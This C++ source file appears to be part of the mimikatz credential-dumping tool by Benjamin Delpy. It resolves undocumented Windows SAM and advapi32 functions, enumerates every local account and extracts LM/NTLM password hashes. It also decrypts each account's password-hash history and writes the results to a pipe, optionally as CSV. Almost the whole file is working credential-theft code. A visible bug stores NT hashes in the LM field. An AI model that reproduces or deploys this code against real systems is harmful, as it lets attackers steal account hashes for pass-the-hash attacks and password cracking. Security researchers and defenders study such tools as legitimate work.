/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "sam.h"

PSAM_I_CONNECT SamIConnect = reinterpret_cast<PSAM_I_CONNECT>(NULL);
PSAM_R_OPEN_DOMAIN SamrOpenDomain = reinterpret_cast<PSAM_R_OPEN_DOMAIN>(NULL);
PSAM_R_OPEN_USER SamrOpenUser = reinterpret_cast<PSAM_R_OPEN_USER>(NULL);
PSAM_R_ENUMERATE_USERS_IN_DOMAIN SamrEnumerateUsersInDomain = reinterpret_cast<PSAM_R_ENUMERATE_USERS_IN_DOMAIN>(NULL);
PSAM_R_QUERY_INFORMATION_USER SamrQueryInformationUser = reinterpret_cast<PSAM_R_QUERY_INFORMATION_USER>(NULL);
PSAM_I_FREE_SAMPR_USER_INFO_BUFFER SamIFree_SAMPR_USER_INFO_BUFFER = reinterpret_cast<PSAM_I_FREE_SAMPR_USER_INFO_BUFFER>(NULL);
PSAM_I_FREE_SAMPR_ENUMERATION_BUFFER SamIFree_SAMPR_ENUMERATION_BUFFER = reinterpret_cast<PSAM_I_FREE_SAMPR_ENUMERATION_BUFFER>(NULL);
PSAM_R_CLOSE_HANDLE SamrCloseHandle = reinterpret_cast<PSAM_R_CLOSE_HANDLE>(NULL);
PSAM_I_GET_PRIVATE_DATA SamIGetPrivateData = reinterpret_cast<PSAM_I_GET_PRIVATE_DATA>(NULL);
PSYSTEM_FUNCTION_025 SystemFunction025 = reinterpret_cast<PSYSTEM_FUNCTION_025>(NULL);
PSYSTEM_FUNCTION_027 SystemFunction027 = reinterpret_cast<PSYSTEM_FUNCTION_027>(NULL);

bool searchSAMFuncs()
{
	if(!(SamIConnect &&
		SamrOpenDomain &&
		SamrOpenUser &&
		SamrEnumerateUsersInDomain &&
		SamrQueryInformationUser &&
		SamIFree_SAMPR_USER_INFO_BUFFER &&
		SamIFree_SAMPR_ENUMERATION_BUFFER &&
		SamrCloseHandle &&
		SamIGetPrivateData &&
		SystemFunction025 &&
		SystemFunction027))
	{
		HMODULE hSamsrv = GetModuleHandle(L"samsrv");
		HMODULE hAdvapi32 = GetModuleHandle(L"advapi32");

		if(hSamsrv && hAdvapi32)
		{
			SamIConnect = reinterpret_cast<PSAM_I_CONNECT>(GetProcAddress(hSamsrv, "SamIConnect"));
			SamrOpenDomain = reinterpret_cast<PSAM_R_OPEN_DOMAIN>(GetProcAddress(hSamsrv, "SamrOpenDomain"));
			SamrOpenUser = reinterpret_cast<PSAM_R_OPEN_USER>(GetProcAddress(hSamsrv, "SamrOpenUser"));
			SamrEnumerateUsersInDomain = reinterpret_cast<PSAM_R_ENUMERATE_USERS_IN_DOMAIN>(GetProcAddress(hSamsrv, "SamrEnumerateUsersInDomain"));
			SamrQueryInformationUser = reinterpret_cast<PSAM_R_QUERY_INFORMATION_USER>(GetProcAddress(hSamsrv, "SamrQueryInformationUser"));
			SamIFree_SAMPR_USER_INFO_BUFFER = reinterpret_cast<PSAM_I_FREE_SAMPR_USER_INFO_BUFFER>(GetProcAddress(hSamsrv, "SamIFree_SAMPR_USER_INFO_BUFFER"));
			SamIFree_SAMPR_ENUMERATION_BUFFER = reinterpret_cast<PSAM_I_FREE_SAMPR_ENUMERATION_BUFFER>(GetProcAddress(hSamsrv, "SamIFree_SAMPR_ENUMERATION_BUFFER"));
			SamrCloseHandle = reinterpret_cast<PSAM_R_CLOSE_HANDLE>(GetProcAddress(hSamsrv, "SamrCloseHandle"));
			SamIGetPrivateData = reinterpret_cast<PSAM_I_GET_PRIVATE_DATA>(GetProcAddress(hSamsrv, "SamIGetPrivateData"));
			SystemFunction025 = reinterpret_cast<PSYSTEM_FUNCTION_025>(GetProcAddress(hAdvapi32, "SystemFunction025"));
			SystemFunction027 = reinterpret_cast<PSYSTEM_FUNCTION_027>(GetProcAddress(hAdvapi32, "SystemFunction027"));
		}
		return (SamIConnect &&
			SamrOpenDomain &&
			SamrOpenUser &&
			SamrEnumerateUsersInDomain &&
			SamrQueryInformationUser &&
			SamIFree_SAMPR_USER_INFO_BUFFER &&
			SamIFree_SAMPR_ENUMERATION_BUFFER &&
			SamrCloseHandle);
	}
	else return true;
}

__kextdll bool __cdecl getSAMFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	monStream << L"** samsrv.dll/advapi32.dll ** ; Statut recherche : " << (searchSAMFuncs() ? L"OK :)" : L"KO :(") << endl << endl <<
		L"@SamIConnect                       = " << SamIConnect << endl <<
		L"@SamrOpenDomain                    = " << SamrOpenDomain << endl <<
		L"@SamrOpenUser                      = " << SamrOpenUser << endl <<
		L"@SamrEnumerateUsersInDomain        = " << SamrEnumerateUsersInDomain << endl <<
		L"@SamrQueryInformationUser          = " << SamrQueryInformationUser << endl <<
		L"@SamIFree_SAMPR_USER_INFO_BUFFER   = " << SamIFree_SAMPR_USER_INFO_BUFFER << endl <<
		L"@SamIFree_SAMPR_ENUMERATION_BUFFER = " << SamIFree_SAMPR_ENUMERATION_BUFFER << endl <<
		L"@SamrCloseHandle                   = " << SamrCloseHandle << endl <<
		L"@SamIGetPrivateData                = " << SamIGetPrivateData << endl <<
		L"@SystemFunction025                 = " << SystemFunction025 << endl <<
		L"@SystemFunction027                 = " << SystemFunction027 << endl;
	return sendTo(monPipe, monStream.str());
}

__kextdll bool __cdecl getLocalAccounts(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	if(searchSAMFuncs())
	{
		bool sendOk = true, history = true, isCSV = false;
		USER_INFORMATION_CLASS monType = UserInternal1Information;

		if(!mesArguments->empty())
		{
			isCSV = ((_wcsicmp(mesArguments->front().c_str(), L"/csv") == 0) || _wcsicmp(mesArguments->back().c_str(), L"/csv") == 0);
			monType = (((_wcsicmp(mesArguments->front().c_str(), L"/full") == 0) || _wcsicmp(mesArguments->back().c_str(), L"/full") == 0) ? UserAllInformation : UserInternal1Information);
		}

		LSA_HANDLE handlePolicy = NULL;
		HSAM handleSam = NULL;
		HDOMAIN handleDomain = NULL;
		HUSER handleUser = NULL;

		LSA_OBJECT_ATTRIBUTES objectAttributes;
		memset(&objectAttributes, NULL, sizeof(objectAttributes));
		PPOLICY_ACCOUNT_DOMAIN_INFO ptrPolicyDomainInfo;

		NTSTATUS retourEnum = 0;
		PSAMPR_ENUMERATION_BUFFER ptrStructEnumUser = NULL;
		DWORD EnumerationContext = 0;
		DWORD EnumerationSize = 0;

		PSAMPR_USER_INFO_BUFFER ptrMesInfosUsers = NULL;

		if(NT_SUCCESS(LsaOpenPolicy(NULL, &objectAttributes, POLICY_ALL_ACCESS, &handlePolicy)))
		{
			if(NT_SUCCESS(LsaQueryInformationPolicy(handlePolicy, PolicyAccountDomainInformation, reinterpret_cast<PVOID *>(&ptrPolicyDomainInfo))))
			{
				if(NT_SUCCESS(SamIConnect(NULL, &handleSam, 1, SAM_SERVER_CONNECT)))
				{
					if(NT_SUCCESS(SamrOpenDomain(handleSam, DOMAIN_ALL_ACCESS, ptrPolicyDomainInfo->DomainSid, &handleDomain)))
					{
						wstring domainName = mod_text::stringOfSTRING(ptrPolicyDomainInfo->DomainName);
						do
						{
							retourEnum = SamrEnumerateUsersInDomain(handleDomain, &EnumerationContext, NULL, &ptrStructEnumUser, 1000, &EnumerationSize);
							if(NT_SUCCESS(retourEnum) || retourEnum == STATUS_MORE_ENTRIES)
							{
								for(DWORD numUser = 0; numUser < ptrStructEnumUser->EntriesRead && sendOk; numUser++)
								{
									wstring monUserName = mod_text::stringOfSTRING(ptrStructEnumUser->Buffer[numUser].Name);
									ptrMesInfosUsers = NULL;

									if(NT_SUCCESS(SamrOpenUser(handleDomain, USER_ALL_ACCESS, ptrStructEnumUser->Buffer[numUser].RelativeId, &handleUser)))
									{
										if(NT_SUCCESS(SamrQueryInformationUser(handleUser, monType, &ptrMesInfosUsers)))
										{
											WUserAllInformation mesInfos = UserInformationsToStruct(monType, ptrMesInfosUsers);
											mesInfos.UserId = ptrStructEnumUser->Buffer[numUser].RelativeId;
											mesInfos.DomaineName = mod_text::stringOfSTRING(ptrPolicyDomainInfo->DomainName);

											if(mesInfos.UserName.empty())
												mesInfos.UserName = mod_text::stringOfSTRING(ptrStructEnumUser->Buffer[numUser].Name);

											sendOk = descrToPipeInformations(monPipe, monType, mesInfos, isCSV);
											SamIFree_SAMPR_USER_INFO_BUFFER(ptrMesInfosUsers, monType);
										}
										
										if(history && SamIGetPrivateData != NULL)
										{
											sendOk = descrUserHistoryToPipe(monPipe, ptrStructEnumUser->Buffer[numUser].RelativeId, monUserName, domainName, handleUser, monType, isCSV);
										}
										SamrCloseHandle(reinterpret_cast<PHANDLE>(&handleUser));
									}
									else sendOk = sendTo(monPipe, L"Impossible d\'ouvrir l\'objet utilisateur\n");
								}
								SamIFree_SAMPR_ENUMERATION_BUFFER(ptrStructEnumUser);
							}
							else sendOk = sendTo(monPipe, L"Echec dans l\'obtention de la liste des objets\n");

						} while(retourEnum == STATUS_MORE_ENTRIES && sendOk);
						SamrCloseHandle(reinterpret_cast<PHANDLE>(&handleDomain));
					}
					else sendOk = sendTo(monPipe, L"Impossible d\'obtenir les information sur le domaine\n");
					SamrCloseHandle(reinterpret_cast<PHANDLE>(&handleSam));
				}
				else sendOk = sendTo(monPipe, L"Impossible de se connecter à la base de sécurité du domaine\n");
				LsaFreeMemory(ptrPolicyDomainInfo);
			}
			else sendOk = sendTo(monPipe, L"Impossible d\'obtenir des informations sur la politique de sécurité\n");
			LsaClose(handlePolicy);
		}
		else sendOk = sendTo(monPipe, L"Impossible d\'ouvrir la politique de sécurité\n");

		return sendOk;
	}
	else return getSAMFunctions(monPipe, mesArguments);
}

bool descrToPipeInformations(mod_pipe * monPipe, USER_INFORMATION_CLASS type, WUserAllInformation & mesInfos, bool isCSV)
{
	wstringstream maReponse;

	switch(type)
	{
	case UserInternal1Information:
		if(isCSV)
		{
			maReponse <<
				mesInfos.UserId << L";" <<
				mesInfos.UserName << L";" <<
				mesInfos.DomaineName << L";" <<
				mesInfos.LmOwfPassword << L";" <<
				mesInfos.NtOwfPassword << L";"
				;
		}
		else
		{
			maReponse << 
				L"ID                      : " << mesInfos.UserId << endl <<
				L"Nom                     : " << mesInfos.UserName << endl <<
				L"Domaine                 : " << mesInfos.DomaineName << endl <<
				L"Hash LM                 : " << mesInfos.LmOwfPassword << endl <<
				L"Hash NTLM               : " << mesInfos.NtOwfPassword << endl
				;
		}
		break;
	case UserAllInformation:
		if(isCSV)
		{
			maReponse <<
				mesInfos.UserId << L';' <<
				mesInfos.UserName << L';' <<
				mesInfos.DomaineName << L';' <<
				protectMe(mesInfos.FullName) << L';' <<
				mesInfos.isActif << L';' <<
				mesInfos.isLocked << L';' <<
				mesInfos.TypeCompte << L';' <<
				protectMe(mesInfos.UserComment) << L';' <<
				protectMe(mesInfos.AdminComment) << L';' <<
				mesInfos.AccountExpires_strict << L';' <<
				protectMe(mesInfos.WorkStations) << L';' <<
				protectMe(mesInfos.HomeDirectory) << L';' <<
				protectMe(mesInfos.HomeDirectoryDrive) << L';' <<
				protectMe(mesInfos.ProfilePath) << L';' <<
				protectMe(mesInfos.ScriptPath) << L';' <<
				mesInfos.LogonCount << L';' <<
				mesInfos.BadPasswordCount << L';' <<
				mesInfos.LastLogon_strict << L';' <<
				mesInfos.LastLogoff_strict << L';' <<
				mesInfos.PasswordLastSet_strict << L';' <<
				mesInfos.isPasswordNotExpire << L';' <<
				mesInfos.isPasswordNotRequired << L';' <<
				mesInfos.isPasswordExpired << L';' <<
				mesInfos.PasswordCanChange_strict << L';' <<
				mesInfos.PasswordMustChange_strict << L';' <<
				mesInfos.LmOwfPassword << L';' <<
				mesInfos.NtOwfPassword << L';'
				;
		}
		else
		{
			maReponse << boolalpha <<
				L"Compte" << endl <<
				L"======" << endl <<
				L"ID                      : " << mesInfos.UserId << endl <<
				L"Nom                     : " << mesInfos.UserName << endl <<
				L"Domaine                 : " << mesInfos.DomaineName << endl <<
				L"Nom complet             : " << mesInfos.FullName << endl <<
				L"Actif                   : " << mesInfos.isActif << endl <<
				L"Verouillé               : " << mesInfos.isLocked << endl <<
				L"Type                    : " << mesInfos.TypeCompte << endl <<
				L"Commentaire utilisateur : " << mesInfos.UserComment << endl <<
				L"Commentaire admin       : " << mesInfos.AdminComment << endl <<
				L"Expiration              : " << mesInfos.AccountExpires << endl <<
				L"Station(s)              : " << mesInfos.WorkStations << endl <<
				endl <<
				L"Chemins" << endl <<
				L"-------" << endl <<
				L"Répertoire de base      : " << mesInfos.HomeDirectory << endl <<
				L"Lecteur de base         : " << mesInfos.HomeDirectoryDrive << endl <<
				L"Profil                  : " << mesInfos.ProfilePath << endl <<
				L"Script de démarrage     : " << mesInfos.ScriptPath << endl <<
				endl <<
				L"Connexions" << endl <<
				L"----------" << endl <<
				L"Nombre                  : " << mesInfos.LogonCount << endl <<
				L"Echecs                  : " << mesInfos.BadPasswordCount << endl <<
				L"Dernière connexion      : " << mesInfos.LastLogon << endl <<
				L"Dernière déconnexion    : " << mesInfos.LastLogoff << endl <<
				endl <<
				L"Mot de passe" << endl <<
				L"------------" << endl <<
				L"Dernier changement      : " << mesInfos.PasswordLastSet << endl <<
				L"N\'expire pas            : " << mesInfos.isPasswordNotExpire << endl <<
				L"Peut être vide          : " << mesInfos.isPasswordNotRequired << endl <<
				L"Mot de passe expiré     : " << mesInfos.isPasswordExpired << endl <<
				L"Possibilité changement  : " << mesInfos.PasswordCanChange << endl <<
				L"Obligation changement   : " << mesInfos.PasswordMustChange << endl <<
				endl <<			
				L"Hashs" << endl <<
				L"-----" << endl <<
				L"Hash LM                 : " << mesInfos.LmOwfPassword << endl <<
				L"Hash NTLM               : " << mesInfos.NtOwfPassword << endl <<
				endl
				;
		}
		break;
	}

	maReponse << endl;
	return sendTo(monPipe, maReponse.str());
}

WUserAllInformation UserInformationsToStruct(USER_INFORMATION_CLASS type, PSAMPR_USER_INFO_BUFFER & monPtr)
{
	WUserAllInformation mesInfos;
	PSAMPR_USER_INTERNAL1_INFORMATION ptrPassword = NULL;
	PSAMPR_USER_ALL_INFORMATION ptrAllInformations = NULL;

	switch(type)
	{
	case UserInternal1Information:
		ptrPassword = reinterpret_cast<PSAMPR_USER_INTERNAL1_INFORMATION>(monPtr);

		mesInfos.LmPasswordPresent = ptrPassword->LmPasswordPresent != 0;
		mesInfos.NtPasswordPresent = ptrPassword->NtPasswordPresent != 0;

		if(mesInfos.LmPasswordPresent)
			mesInfos.LmOwfPassword = mod_text::stringOfHex(ptrPassword->EncryptedLmOwfPassword.data, sizeof(ptrPassword->EncryptedLmOwfPassword.data));
		if(mesInfos.NtPasswordPresent)
			mesInfos.LmOwfPassword = mod_text::stringOfHex(ptrPassword->EncryptedNtOwfPassword.data, sizeof(ptrPassword->EncryptedNtOwfPassword.data));
		break;

	case UserAllInformation:
		ptrAllInformations = reinterpret_cast<PSAMPR_USER_ALL_INFORMATION>(monPtr);

		mesInfos.UserId = ptrAllInformations->UserId;
		mesInfos.UserName = mod_text::stringOfSTRING(ptrAllInformations->UserName);
		mesInfos.FullName = mod_text::stringOfSTRING(ptrAllInformations->FullName); correctMe(mesInfos.FullName);
		
		mesInfos.isActif = (ptrAllInformations->UserAccountControl & USER_ACCOUNT_DISABLED) == 0;
		mesInfos.isLocked = (ptrAllInformations->UserAccountControl & USER_ACCOUNT_AUTO_LOCKED) != 0;

		if(ptrAllInformations->UserAccountControl & USER_SERVER_TRUST_ACCOUNT)
			mesInfos.TypeCompte.assign(L"Contrôleur de domaine");
		else if(ptrAllInformations->UserAccountControl & USER_WORKSTATION_TRUST_ACCOUNT)
			mesInfos.TypeCompte.assign(L"Ordinateur");
		else if(ptrAllInformations->UserAccountControl & USER_NORMAL_ACCOUNT)
			mesInfos.TypeCompte.assign(L"Utilisateur");
		else
			mesInfos.TypeCompte.assign(L"Inconnu");

		mesInfos.UserComment = mod_text::stringOfSTRING(ptrAllInformations->UserComment); correctMe(mesInfos.AdminComment);
		mesInfos.AdminComment = mod_text::stringOfSTRING(ptrAllInformations->AdminComment); correctMe(mesInfos.AdminComment);
		mesInfos.AccountExpires = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->AccountExpires);
		mesInfos.AccountExpires_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->AccountExpires, true);
		mesInfos.WorkStations = mod_text::stringOfSTRING(ptrAllInformations->WorkStations);
		mesInfos.HomeDirectory = mod_text::stringOfSTRING(ptrAllInformations->HomeDirectory); correctMe(mesInfos.HomeDirectory);
		mesInfos.HomeDirectoryDrive = mod_text::stringOfSTRING(ptrAllInformations->HomeDirectoryDrive); correctMe(mesInfos.HomeDirectoryDrive);
		mesInfos.ProfilePath = mod_text::stringOfSTRING(ptrAllInformations->ProfilePath); correctMe(mesInfos.ProfilePath);
		mesInfos.ScriptPath = mod_text::stringOfSTRING(ptrAllInformations->ScriptPath); correctMe(mesInfos.ScriptPath);
		mesInfos.LogonCount = ptrAllInformations->LogonCount;
		mesInfos.BadPasswordCount = ptrAllInformations->BadPasswordCount;
		mesInfos.LastLogon = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->LastLogon);
		mesInfos.LastLogon_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->LastLogon, true);
		mesInfos.LastLogoff = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->LastLogoff);
		mesInfos.LastLogoff_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->LastLogoff, true);
		mesInfos.PasswordLastSet = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordLastSet);
		mesInfos.PasswordLastSet_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordLastSet, true);
		mesInfos.isPasswordNotExpire = (ptrAllInformations->UserAccountControl & USER_DONT_EXPIRE_PASSWORD) != 0;
		mesInfos.isPasswordNotRequired = (ptrAllInformations->UserAccountControl & USER_PASSWORD_NOT_REQUIRED) != 0;
		mesInfos.isPasswordExpired = ptrAllInformations->PasswordExpired != 0;
		mesInfos.PasswordCanChange = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordCanChange);
		mesInfos.PasswordCanChange_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordCanChange, true);
		mesInfos.PasswordMustChange = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordMustChange);
		mesInfos.PasswordMustChange_strict = toTimeFromOLD_LARGE_INTEGER(ptrAllInformations->PasswordMustChange, true);
		mesInfos.LmPasswordPresent = ptrAllInformations->LmPasswordPresent != 0;
		mesInfos.NtPasswordPresent = ptrAllInformations->NtPasswordPresent != 0;

		if(mesInfos.LmPasswordPresent)
			mesInfos.LmOwfPassword = mod_text::stringOfHex(reinterpret_cast<BYTE *>(ptrAllInformations->LmOwfPassword.Buffer), ptrAllInformations->LmOwfPassword.Length);
		if(mesInfos.NtPasswordPresent)
			mesInfos.LmOwfPassword = mod_text::stringOfHex(reinterpret_cast<BYTE *>(ptrAllInformations->NtOwfPassword.Buffer), ptrAllInformations->NtOwfPassword.Length);

		break;
	}
	return mesInfos;
}

bool descrUserHistoryToPipe(mod_pipe * monPipe, DWORD rid, wstring monUserName, wstring domainName, HUSER handleUser, USER_INFORMATION_CLASS type, bool isCSV)
{
	WUserAllInformation mesInfos;
	mesInfos.DomaineName = domainName;
	mesInfos.UserId = rid;

	DWORD Context = 2, Type = 0, tailleBlob;
	PWHashHistory pMesDatas = NULL;
	bool sendOk = true;
	
	if(NT_SUCCESS(SamIGetPrivateData(handleUser, &Context, &Type, &tailleBlob, &pMesDatas)))
	{
		unsigned short nbEntrees = min(pMesDatas->histNTLMsize, pMesDatas->histLMsize) / 16;

		for(unsigned short i = 1; i < nbEntrees && sendOk; i++)
		{
			BYTE monBuff[16] = {0};

			wostringstream userNameQualif;
			userNameQualif << monUserName << L"{p-" << i << L"}";
			mesInfos.UserName = userNameQualif.str();
			
			if(NT_SUCCESS(SystemFunction025(pMesDatas->hashs[nbEntrees + i], &rid, monBuff)))
			{
				mesInfos.LmPasswordPresent = 1;
				mesInfos.LmOwfPassword = mod_text::stringOfHex(monBuff, 0x10);
			}
			else
			{
				mesInfos.LmPasswordPresent = 0;
				mesInfos.LmOwfPassword = L"échec de décodage :(";
			}

			if(NT_SUCCESS(SystemFunction027(pMesDatas->hashs[i], &rid, monBuff)))
			{
				mesInfos.NtPasswordPresent = 1;
				mesInfos.NtOwfPassword = mod_text::stringOfHex(monBuff, 0x10);
			}
			else
			{
				mesInfos.NtPasswordPresent = 0;
				mesInfos.NtOwfPassword = L"échec de décodage :(";
			}

			sendOk = descrToPipeInformations(monPipe, type, mesInfos, isCSV);
		}
		LocalFree(pMesDatas);
	}
	return sendOk;
}

wstring toTimeFromOLD_LARGE_INTEGER(OLD_LARGE_INTEGER & monInt, bool isStrict)
{
	wostringstream reponse;

	if(monInt.LowPart == ULONG_MAX && monInt.HighPart == LONG_MAX)
	{
		if(!isStrict)
			reponse << L"N\'arrive jamais";
	}
	else if(monInt.LowPart == 0 && monInt.HighPart == 0)
	{
		if(!isStrict)
			reponse << L"N\'est pas encore arrivé";
	}
	else
	{
		SYSTEMTIME monTimeStamp;
		if(FileTimeToSystemTime(reinterpret_cast<PFILETIME>(&monInt), &monTimeStamp) != FALSE)
		{
			reponse << dec << 
				setw(2)<< setfill(wchar_t('0')) << monTimeStamp.wDay << L"/" <<
				setw(2)<< setfill(wchar_t('0')) << monTimeStamp.wMonth << L"/" <<
				setw(4)<< setfill(wchar_t('0')) << monTimeStamp.wYear << L" " <<
				setw(2)<< setfill(wchar_t('0')) << monTimeStamp.wHour << L":" << 
				setw(2)<< setfill(wchar_t('0')) << monTimeStamp.wMinute << L":" << 
				setw(2)<< setfill(wchar_t('0')) << monTimeStamp.wSecond;
		}
	}
	return reponse.str();
}

wstring protectMe(wstring &maChaine)
{
	wstring result;
	if(!maChaine.empty())
	{
		result = L"\"";
		result.append(maChaine);
		result.append(L"\"");
	}
	return result;
}

void correctMe(wstring &maChaine)
{
	unsigned char source[] = {0x19, 0x20, 0x13, 0x20, 0xab, 0x00, 0xbb, 0x00, 0x26, 0x20};
	unsigned char replac[] = {'\'', 0   , '-' , 0   , '\"', 0   , '\"', 0,    '.',  0   };

	for(unsigned int i = 0; i < maChaine.size() ; i++)
	{
		const BYTE * monPtr = reinterpret_cast<const BYTE *>(&maChaine.c_str()[i]);
		for(int j = 0 ; j < min(sizeof(source), sizeof(replac)) ; j+=2)
		{
			if(*monPtr == source[j] && *(monPtr + 1) == source[j+1])
			{
				*const_cast<BYTE *>(monPtr) = replac[j];
				*const_cast<BYTE *>(monPtr + 1) = replac[j + 1];
				break;
			}
		}
	}
}